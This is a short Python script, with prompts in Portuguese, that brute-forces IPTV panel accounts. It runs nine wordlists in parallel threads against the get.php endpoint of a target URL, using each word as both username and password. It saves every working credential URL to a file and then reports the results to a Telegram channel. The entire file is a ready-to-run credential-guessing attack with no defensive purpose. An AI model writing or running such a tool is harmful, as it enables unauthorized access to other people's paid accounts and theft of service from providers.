from requests import get 
from threading import Thread
from tqdm import tqdm
from iptv.iptv import Iptv_analyzer
from time import sleep

cv = Iptv_analyzer()
f = open("funciona.txt", 'w')
f.close()

e = input('digite a url com a porta: ')
headers = {"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"}

def bruteForce(wordlist):

	with open(wordlist, 'r', encoding="utf8") as myfile:
		loop = tqdm(total= 1465, position=0, leave=False)
		for line in myfile:
			loop.set_description("Loading...".format(len(line)))
			
			try:
				url = e+'/get.php?username={0}&password={0}&type=m3u'.format(line.strip())
				resposta = get(url, headers=headers)
				
				if resposta.status_code == 200:
					cv.iptv(url, e)
					a = open('contas.txt', 'a')
					a.write(f'{url}\n')
					a.close()
			except:
				continue
			loop.update(1)
		
	loop.close()
if __name__ == '__main__':
	
	listas = ["wl1.txt",'wl2.txt', 'wl3.txt', 'wl4.txt', 'wl5.txt', 'wl6.txt', 'wl7.txt', 'wl8.txt', 'wl9.txt']
	procs = []

	for lista in listas:
		proc = Thread(target=bruteForce, args=(lista,))
		procs.append(proc)
		proc.start()
	for proc in procs:
		proc.join()
	
	# Send message channel telegram	
	cv.sendTelegram()